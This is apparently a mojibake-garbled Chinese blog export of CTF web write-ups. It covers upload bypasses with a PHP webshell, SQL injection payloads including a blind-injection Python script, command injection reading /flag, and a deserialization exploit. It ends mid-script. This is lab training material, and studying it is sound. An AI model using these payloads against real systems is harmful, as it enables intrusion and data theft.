upload1æ€è·¯:ç¡®å®šç™½é»‘åå•è¿‡æ»¤ï¼Œè‹¥ä¸ºé»‘åå•ï¼Œå°è¯•php3,phtmlç­‰åç¼€ï¼Œä¿®æ”¹mimeç±»å‹ç»•è¿‡å›¾ç‰‡æ£€æŸ¥ï¼ŒåŠ å…¥å›¾ç‰‡æ–‡ä»¶å¤´ç­‰:å‘ç°æ£€æŸ¥äº†&lt;?æ‰€ä»¥æ›´æ¢ä¸€å¥è¯æœ¨é©¬ä¹¦å†™æ–¹å¼: 1&lt;script language=&quot;php&quot;&gt;evla($_POST[a]);&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$file = $_FILES[&quot;file&quot;];// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€$allowedExts = array(&quot;php&quot;,&quot;php2&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;pht&quot;,&quot;phtm&quot;);$temp = explode(&quot;.&quot;, $file[&quot;name&quot;]);$extension = strtolower(end($temp)); // è·å–æ–‡ä»¶åç¼€å$image_type = @exif_imagetype($file[&quot;tmp_name&quot;]);if ((($file[&quot;type&quot;] == &quot;image/gif&quot;)|| ($file[&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($file[&quot;type&quot;] == &quot;image/jpg&quot;)|| ($file[&quot;type&quot;] == &quot;image/pjpeg&quot;)|| ($file[&quot;type&quot;] == &quot;image/x-png&quot;)|| ($file[&quot;type&quot;] == &quot;image/png&quot;))&amp;&amp;$file[&quot;size&quot;] &lt; 20480) // å°äº 20 kb{ if ($file[&quot;error&quot;] &gt; 0){ echo &quot;ERROR!!!&quot;; } elseif (in_array($extension, $allowedExts)) { echo &quot;NOTï¼&quot;.$extension.&quot;!&quot;; } elseif (mb_strpos(file_get_contents($file[&quot;tmp_name&quot;]), &quot;&lt;?&quot;) !== FALSE) { echo &quot;NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;'&quot;; } elseif (!$image_type) { echo &quot;Don't lie to me, it's not image at all!!!&quot;; } else{ $fileName='./upload/'.$file['name']; move_uploaded_file($file['tmp_name'],$fileName); echo &quot;ä¸Šä¼ æ–‡ä»¶å: &quot; . $file[&quot;name&quot;] . &quot;&lt;br&gt;&quot;; }}else{ echo &quot;Not image!&quot;;}?&gt; è¿™è¾¹éœ€è¦çŒœæµ‹ä¸Šä¼ è·¯å¾„ï¼Œç”±äºé¡µé¢ä¸ºupload_file.php,æ‰€ä»¥è¿™é‡ŒçŒœæµ‹uploadï¼Œå‘ç°å¯ä»¥è¿æ¥ä¸Š:,æ‰¾åˆ°ä»¥ä¸Šæºç ï¼Œå­¦ä¹ åˆ†æä¸€æ³¢: é»‘åå•ï¼Œæ£€æŸ¥MIMEç±»å‹ï¼Œæ£€æŸ¥&lt;?ï¼Œä½¿ç”¨äº†exif_imagetypeå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯æ£€æŸ¥æ–‡ä»¶çš„å‰å‡ ä¸ªå­—èŠ‚ï¼Œuploadé‡Œé¢æœ‰ä»‹ç»è¿‡ï¼Œä½¿ç”¨æ–‡ä»¶é©¬ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åˆæˆä»¥åï¼Œå†å°†åç¼€æ”¹å›phtmlç›´æ¥ä¸Šä¼ ã€‚è¿™é‡Œæœ‰ä¸ªå·¨å‘ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼æ–‡ä»¶å¤§å°å°äº20kbï¼Œæˆ‘ä¸€å¼€å§‹ç”¨å›¾ç‰‡é©¬ä¸è¡Œï¼Œåæ¥çœ‹äº†wpçœ‹åˆ°äººå®¶åªç”¨äº†gif89aå°±å¯ç›´æ¥ç»•è¿‡ï¼Œæ˜æ˜æˆ‘ç”¨æ–‡ä»¶åˆæˆä»¥åä¹Ÿæœ‰è¿™ä¸ªï¼Œæ‰å‘ç°åŸæ¥æ˜¯æœ‰ä¸ªæ–‡ä»¶å¤§å°é™åˆ¶ï¼Œæˆ‘åäº†ï¼ï¼è¿™ä¸€ç‚¹ä»¥åè¦è®°ä½å‘€ä¸ç„¶ä¹Ÿå¯ä»¥ä»¥åç›´æ¥ä½¿ç”¨GIF89aå®ç°ç»•è¿‡ã€‚å°±ä¸ç”¨è€ƒè™‘æ–‡ä»¶å¤§å°çš„å…³ç³»äº†ã€‚å°è¯•äº†ä¸€ä¸‹ï¼Œè¿™é¢˜ç”¨ä¸äº†apacheçš„è§£ææ¼æ´ è¿™é‡Œå†æ¥æ¢³ç†ä¸€ä¸‹è¿™é¢˜çš„æ€è·¯å§:é»‘åå•orç™½åå•:é»‘åå•:å…ˆä½¿ç”¨å…¶ä»–åç¼€è¿›è¡Œå°è¯•ï¼Œæˆ–è€…ä½¿ç”¨è§£ææ¼æ´ï¼Œè‹¥è¢«æ‹¦æˆªï¼Œæ”¹ä¸€ä¸‹mimeç±»å‹ä»¥åŠåŠ ä¸€ä¸‹å¤´è¯†åˆ«å­—èŠ‚(GIF89a)æ–‡ä»¶ä¸Šä¼ æœ€ä¸»è¦çš„è¿˜æ˜¯è€å¿ƒå§ï¼Œæ¯•ç«Ÿæœ‰å¾ˆå¤šè¦å»æµ‹è¯• httpæ‰«æç›®å½•ï¼Œåç¼€å­—å…¸ï¼Œçœ‹çœ‹æœ‰ä¹ˆæœ‰éšè—ç›®å½•ï¼Œå‘ç°/Secret.php ä¸€çœ‹å°±çŸ¥é“è¦æ”¹refererï¼Œ ä¸­é—´æœ‰ä¸ªæ”¹æµè§ˆå™¨çš„ï¼Œç›´æ¥çœ‹çœ‹å“ªé‡Œæœ‰ä¸ªfirefoxï¼Œç„¶åæ”¹ä¸€ä¸‹ babysqlåŒå†™ç»•è¿‡+union select [ACTF2020 æ–°ç”Ÿèµ›]Uploadburp suitæ”¹åç¼€ï¼Œphtmlåç¼€å³å¯ç»•è¿‡,è¿™é‡Œéœ€è¦æŠ“åŒ…æ”¹åç¼€ [ACTF2020 æ–°ç”Ÿèµ›]BackupFileå¤‡ä»½æ–‡ä»¶å°è¯•ä¸€ä¸‹ å‘ç°index.php.bak 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) {//ä¸èƒ½ä¸ºå­—ç¬¦ä¸² åªèƒ½è¾“å…¥æ•°å­—ï¼Œæ‰€ä»¥å°±æƒ³åˆ°åå…­è¿›åˆ¶ exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; }}else { echo &quot;Try to find out source file!&quot;;} è€ƒå¯Ÿå¼±ç±»å‹æ¯”è¾ƒï¼Œæ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œé‡åˆ°å­—ç¬¦ä¸²ä¼šè‡ªåŠ¨æˆªæ–­åé¢å†…å®¹ï¼Œåªä¼šè¿›è¡Œå‰é¢æ•°å­—çš„æ¯”è¾ƒä¾‹å¦‚123aå’Œ123å°±æ˜¯ç›¸ç­‰çš„ï¼Œä½†æ˜¯a123å’Œ123å°±ä¸ç­‰","link":"/2021/03/18/buuctf2/"},{"title":"bugku4","text":"web37å…ˆæ‰«ä¸‹åå°ï¼Œçœ‹æœ‰æ²¡æœ‰å…¶ä»–ä¸œè¥¿ï¼Œå‘ç°æ²¡æœ‰ï¼Œå†ç™»å½•çª—å£å°è¯•æ‰‹å·¥æ³¨å…¥ä¹Ÿæ²¡æœ‰ç»“æœï¼Œå†æ‰¾æ‰¾æœ‰æ²¡æœ‰å…¶ä»–æç¤ºå§:æ”¶åˆ°çš„æŠ¥æ–‡ä¸­æœ‰ä¸€ä¸ªï¼ŒæŠŠä»–æ‹¿å»base64è§£ç  123$sql=&quot;SELECT username,password FROM admin WHERE username='&quot;.$username.&quot;'&quot;;if (!empty($row) &amp;&amp; $row['password']===md5($password)){} ä»ä¸Šé¢è¿™é‡Œçœ‹æ¥ï¼Œé—­åˆçš„æ‰‹æ®µæ˜¯.&quot;': æ ¹æ®ä¸‹é¢çš„æç¤ºæ˜¯passwordå¼º==md5ç¼–ç çš„password===è¯´æ˜ç±»å‹æ•°å€¼éƒ½è¦ä¸€æ ·ï¼Œé‚£ä¹ˆå¦‚æœè®©å…¶ç›¸ç­‰å‘¢ï¼Œå»æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°å…¶å®å¯ä»¥ä½¿ç”¨unionè”åˆè¯­å¥payload: 11.&quot;'union select 1,'e10adc3949ba59abbe56e057f20f883e'# è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆï¼Œé¦–å…ˆä¸ºä»€ä¹ˆè¯´æ˜¯çŸ¥é“å­—æ®µæ•°ä¸º2ï¼Ÿâ€”â€”çŒœçš„ä¸€ä¸ªä¸ªå»è¯•ç„¶åè¿™æ ·å†™çš„åŸç†æ˜¯ä»€ä¹ˆï¼šunion select 1,â€™eâ€¦â€™è¢«æ‰§è¡Œåçš„å€¼ä¸ºé‚£ä¸ªrowæˆ‘æ˜¯ä»æ•°æ®åº“æ£€ç´¢ä»¥åçš„ç»“æœï¼Œå½“æ‰§è¡Œäº†è¿™ä¸ªunion selectè¯­å¥ï¼Œrowçš„å€¼å°±ä¼šè¢«èµ‹äºˆæ£€ç´¢çš„passwordçš„å€¼ï¼Œç„¶åæ­¤æ—¶å°±å’Œæˆ‘ä»¬è¾“å…¥çš„passwordçš„MD5çš„å€¼æ˜¯ä¸€è‡´çš„äº†è¿›å…¥åˆ°è¿™ä¸ªé¡µé¢ï¼Œè”æƒ³åˆ°ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å°è¯•äº†å¥½å¤šç§éƒ½æ²¡è¿”å›æœ‰ç”¨çš„ä¿¡æ¯ï¼Ÿæ˜¯ä»€ä¹ˆé¬¼ ç„¶åå°±å»ç™¾åº¦äº†ï¼Œå‘ç°è¿™é‡Œéœ€è¦ç”¨æ—¶é—´ç›²æ³¨ï¼Œå› ä¸ºè¾“å…¥1ï¼›sleep 5 é¡µé¢æ˜¯æœ‰å»¶ç¼“å›æ˜¾çš„ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ¥ä¸‹æ¥è¦å¹²å•¥äº†ï¼Œç„¶åå°±å»çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°ï¼Œæ˜¯è¦ç›‘å¬ç«¯å£ç„¶ååå¼¹shellçš„ï¼Œè¿™é‡Œå°±å¾ˆæ— è¯­äº†ï¼Œå› ä¸ºç›‘å¬äº†å¥½ä¹…éƒ½æ²¡æœ‰åå¼¹ï¼Œç”¨å…¬ç½‘ä¹Ÿä¸è¡Œï¼Œsoå°±å†å»æŸ¥äº†ä¸€ä¸‹wpï¼Œå‘ç°æ˜¯è¦å†™å…¥æ–‡ä»¶ç„¶åæŸ¥çœ‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æˆ‘åäº†ï¼Œè¿™é‡Œå†™ä¸€ä¸‹payloadå§: 1123|ls../../../&gt;text ä¸Šé¢æ˜¯éå†ç›®å½•ï¼Œå¹¶å°†ä¿¡æ¯è¾“å‡ºåˆ°text 1123|cat /flag&gt;test å°†flagçš„ä¿¡æ¯è¾“å‡ºåˆ°testä¸­ web38è¿™ä¸€å…³æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®æˆ‘ä»¬çš„è¾“å…¥ä¿¡æ¯ï¼Œæœ‰illegal character ã€password wrong ã€username donâ€™t exitè¿™å‡ ç§æƒ…å†µï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å…ˆç”¨burpsuit è·‘ä¸€ä¸‹çœ‹å“ªäº›å­—ç¬¦è¢«è¿‡æ»¤äº†å‘ç° = è¢«è¿‡æ»¤äº† è¿˜æœ‰å…¶ä»–ä½†æ˜¯ç›²æ³¨çš„æ‰€éœ€è¦çš„å‘½ä»¤å€’æ˜¯æ²¡æ€ä¹ˆè¢«è¿‡æ»¤ï¼Œä½†æ˜¯æœ€é‡è¦çš„=æ²¡äº†ï¼Œè¦æ€ä¹ˆåŠå‘¢ï¼Ÿï¼Œè¿™ä¸ªæ—¶å€™çœ‹åˆ°ä¸‹é¢æœ‰äººæç¤ºè¯´ç”¨&lt;&gt;æ¥ä»£æ›¿ï¼Œå»æŸ¥äº†ä¸€ä¸‹: æ¥ä¸‹æ¥æ„é€ æ³¨å…¥è¯­å¥æƒ³èµ·æ¥ä¹‹å‰åˆšå­¦çš„ä½¿ç”¨å‡å·è¿›è¡Œè¿æ¥å¹¶ä»¥æ­¤åˆ¤æ–­è¯¥å€¼æ˜¯å¦ä¸ºçœŸçš„æ–¹æ³•ï¼Œå¹¶ä¸”å‡å·ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤adminâ€™-0-â€˜æ˜¯password wrongadminâ€™-1-â€˜æ˜¯username wrong è¿™é‡Œæœ‰ä¸ªmidå‡½æ•°æ˜¯å¯ä»¥ç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨å‰å‡ å¤©åˆšå†™çš„è¯•è¯•çœ‹ 12345678910111213141516171819202122import requestsurl=&quot;http://114.67.246.176:10460/index.php&quot;s=requests.session()headers={&quot;Cookie&quot;: &quot;PHPSESSID=34kfhvoilevqk4p779t36qc2j5&quot;}password = &quot;&quot;for i in range(1,33): for j in '0123456789abcdef': payload =f&quot;admin'-(mid((password)from(-{i}))&lt;&gt;'{j}{password}')-'&quot; #è¿™é‡Œçš„&lt;&gt;çœ‹åˆ°è§£é‡Šæ˜¯ä¸ç­‰ä¸ºture å¸ƒå°”å€¼ä¸º1ï¼Œé‚£ä¹ˆç›¸ç­‰å°±æ˜¯falseï¼Œå¸ƒå°”å€¼ä¸º0ï¼Œæ‰€ä»¥å’Œä¹‹å‰çš„è„šæœ¬ç›¸æ¯”ï¼Œåªè¦å§ä¸‹é¢çš„åˆ¤æ–­æ”¹ä¸€ä¸‹å°±è¡Œäº† print(payload) data = {'username': payload,'password': 'sky'} # print(s.post(url,data=data).text) if 'password error!' in s.post(url=url,data=data,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#å¯ä¸ç”¨ï¼Œæ˜¯ç”¨æ¥è°ƒè¯•çš„ password += j strA = password password = strA[::-1] print(password) break å¥½çš„è·‘å‡ºæ¥äº†4dcc88f8f1bc05e7c2ad1a60288481a2 åƒæ˜¯MD5ï¼Œå»è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹å¯†ç bugkuctfç™»å½•ä»¥å:flag{75ef5a74fee872de4e775bbbf2f01d22}å°±æˆåŠŸæ‹¿åˆ°flag äº†","link":"/2021/02/03/bugku4/"},{"title":"buuctf4","text":"[GXYCTF2019]BabySQliè¿™é¢˜æ›¾ç»é‡åˆ°è¿‡ï¼ŒæŸ¥çœ‹æºç : 1234if($arr[1] == &quot;admin&quot;){ if(md5($password) == $arr[2]){ echo $flag; } è¿™é‡Œæ˜¯å…³é”®ï¼Œé¦–å…ˆæ˜¯è´¦å·ç­‰äºadminï¼Œæ¥ä¸‹æ¥æ˜¯è¾“å…¥çš„å¯†ç ç­‰äºæŸ¥è¯¢åˆ°çš„å¯†ç ï¼Œæˆ‘ä»¬çŸ¥é“unionè”åˆæŸ¥è¯¢å¦‚æœæ˜¯æœ¬æ¥æ•°æ®åº“å½“ä¸­æ²¡æœ‰çš„å€¼ åˆ™ä¼šå…ˆæ–°å»ºä¸€ä¸ªï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±åˆ©ç”¨è¿™ç‚¹ï¼Œpaylaod: 1name=-1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456 æ­¤æ—¶æŸ¥è¯¢åˆ°çš„å°±æ˜¯æˆ‘ä»¬æ³¨å…¥çš„è¿™ä¸ªadminé‡Œé¢çš„å¯†ç äº† [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzè¿™æ˜¯ä¸€é¢˜ååºåˆ—åŒ–çš„é¢˜ï¼Œæœ€è¿‘åˆšå­¦å®Œï¼Œè¶çƒ­æ‰“é“åšåš 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879include(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename);//åˆ©ç”¨ç‚¹åœ¨è¿™ } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 1.åœ¨read()æ–¹æ³•ä¸­çœ‹åˆ°ä¸€ä¸ªfile_get_contents()å‡½æ•°ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±çœ‹çœ‹å¦‚ä½•é æ‹¢2.å¾ˆæ˜æ˜¾ã€‚ã€‚ã€‚ä¸»è¦æ˜¯opè¦ä¸º2å³å¯è¿›å…¥read()å½“ä¸­ è¿™é‡Œæœ‰ä¸ªå‚æ•°å¾ˆå¥‡æ€ªï¼Œæ˜¯ä¸ªprotectå‚æ•°ï¼šè¿™é‡Œéœ€è¦æˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹protectå±æ€§çš„å‚æ•°privateç±»å‹åœ¨åºåˆ—åŒ–çš„æ ¼å¼ä¸º:%00ç±»å%00*protectedä¸º:%00%00å˜é‡** exp123456789101112&lt;?phphighlight_file(__FILE__);class FileHandler { public $op = 2; public $filename =&quot;flag.php&quot;; public $content=&quot;2&quot;;}$a = new FileHandler();$b = serialize($a);echo($b);?&gt; è€ƒç‚¹1ï¼šåœ¨functionä¸­çš„__destructä½¿ç”¨å¼ºæ¯”è¾ƒï¼Œæ¯”è¾ƒopçš„å€¼æ˜¯å¦ä¸º2ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œç”±äºæ¯”è¾ƒçš„æ˜¯â€œ2â€è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªintç±»å‹çš„æ•°æ®2ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†ã€‚è€ƒç‚¹2ï¼šå¼€å¤´å¯¹äºopï¼Œfilenameç­‰å˜é‡çš„å€¼çš„å±æ€§æ˜¯protectï¼Œå½“æˆ‘ä»¬æ‰“å°å‡ºæ¥ä»¥åï¼Œæ˜¯ * çš„å¦‚æœæˆ‘ä»¬ç›´æ¥å¤åˆ¶ç²˜è´´åˆ°urlä¸­ï¼Œè¿™ä¸ªæ˜¯ä¼šè¢«è‡ªåŠ¨åˆ é™¤çš„ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸ª\\00ä½†æ˜¯ç”±äºå®ƒé‚£è¾¹æœ‰ä¸ªis_validçš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™è¾¹å°±ä¼šè¿‡æ»¤ï¼Œæ”¹æˆå…¶ä»–å¸ˆçˆ¶ä»¬è¯´%00ï¼Œæˆ‘ä¹Ÿè§‰å¾—æŒ‰ç†è¯´è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ²¡æœ‰ç»“æœï¼Ÿæ‰€ä»¥æ„Ÿè§‰å¾ˆå¥‡æ€ªæ‰€ä»¥ç»•è¿‡ç‚¹åœ¨è¿™:**åœ¨php7.1+å¯¹ç±»å±æ€§çš„æ£€æµ‹ä¸ä¸¥æ ¼ï¼Œæ‰€ä»¥å¯ä»¥ç”¨publicæ¥ç»•è¿‡ ** [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸ä¼šéš¾1.MIMEç±»å‹æ›´æ”¹ä¸ºimage/jpegç±»å‹2.ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œåç¼€æ”¹ä¸ºjpg3.ä¸Šä¼ .htaccessï¼š 1SetHandler application/x-httpd-php /var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/12 (2).jpg succesfully uploaded!/var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/.htaccess succesfully uploaded! è·å¾—ä»¥ä¸Šè·¯å¾„ 1flag{1f5f9c64-a2c2-4f6d-96f2-a18df9744090} [GYCTF2020]Blacklistæœ¬é¢˜è€ƒæŸ¥çš„ä¾æ—§æ˜¯å †å æ³¨å…¥: 1234set @sql=concat('s','elect `flag` from `FLAGHere`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;1';PREPARE hacker from concat(char(115,101,108,101,99,116), ' * from `FlagHere` ');EXECUTE hacker;# ç”±äºè¿‡æ»¤äº†å¾ˆå¤š æ‰€ä»¥ä»¥ä¸Šå†…å®¹éƒ½ç”¨ä¸äº†è¿™é‡ŒæŸ¥åˆ°äº†ä¸€ç§æ–°æ–¹æ³•: mysqlæŸ¥è¯¢è¯­å¥-handler mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚ HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚2 åŸºæœ¬è¯­æ³• 1234567891011 handlerè¯­å¥çš„è¯­æ³•å¦‚ä¸‹ï¼šHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE â€‹ é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚â€‹ é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚â€‹ é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚ é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚ é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚ å¦‚æœæˆ‘ä»¬ä¸æƒ³æµè§ˆä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œï¼Œå¯ä»¥ä½¿ç”¨whereå’Œlimitå­å¥ã€‚ æ‰€ä»¥è¿™é‡Œçš„payload: 10';use supersqli;handler FlagHere open;Handler FlagHere read first; å‚è€ƒ:https://blog.csdn.net/JesseYoung/article/details/40785137 [MRCTF2020]Ez_bypass123456789101112131415161718192021222324252627282930313233343536373839include 'flag.php';$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo &quot;can you think twice??&quot;; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); }} else { echo &quot;You are not a real hacker!&quot;; }}else{ die('Please input first');}}Please input first [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢è¿˜æ²¡é‡åˆ°è¿™ç§é¢˜ï¼Œæ‰€ä»¥ä¸€å¼€å§‹çœ‹å¾—çœ¼èŠ±ç¼­ä¹±çš„ä¸‹è½½ä¸€ä¸ª7-zipå°†www.tar.gzè§£å‹ç¼©å‡ºæ¥å°±è¡Œï¼Œè§£å‹ç¼©å‡ºæ¥ä»¥åçœ‹åˆ°å¾ˆå¤šä»£ç å¹¶ä¸”çœ‹åˆ°å¾ˆå¤šgetshellçš„è¯­å¥è¿™é‡Œè€ƒæŸ¥çš„å°±æ˜¯ç¼–å†™è„šæœ¬çš„èƒ½åŠ›: è¿™é‡Œè´´ä¸€ä¸ªå¤§ä½¬çš„python: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import osimport requestsimport reimport threadingimport timeprint('å¼€å§‹æ—¶é—´ï¼š '+ time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100) #è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;os.chdir(filePath) #æ”¹å˜å½“å‰çš„è·¯å¾„requests.adapters.DEFAULT_RETRIES = 5 #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalsedef get_content(file): s1.acquire() print('trying '+file+ ' '+ time.asctime( time.localtime(time.time()) )) with open(file,encoding='utf-8') as f: #æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•° gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #æ‰€æœ‰çš„$_POST params = {} #æ‰€æœ‰çš„$_GET for m in gets: params[m] = &quot;echo 'xxxxxx';&quot; for n in posts: data[n] = &quot;echo 'xxxxxx';&quot; url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ req.encoding = 'utf-8' content = req.text #print(content) if &quot;xxxxxx&quot; in content: #å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•° flag = 0 for a 